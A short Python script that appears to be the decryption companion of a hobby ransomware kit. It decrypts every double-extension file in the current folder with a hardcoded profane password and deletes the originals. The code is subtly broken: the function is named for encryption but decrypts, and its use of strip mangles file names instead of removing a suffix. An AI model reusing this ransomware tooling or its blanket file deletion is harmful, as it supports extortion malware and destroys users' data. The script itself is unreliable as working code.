import pyAesCrypt
import os
import re

def encrypt_and_delete(file):
	buffersize=64*1024
	password="Fuck_UR_MOM"
	pyAesCrypt.decryptFile(file,file.strip(".Fuck_UR_MOM") ,password,buffersize)
	os.remove(file)

files=os.listdir()

for file in files:
	x=re.match('\w+\.\w+\.\w',file)

	if x:
		encrypt_and_delete(file)

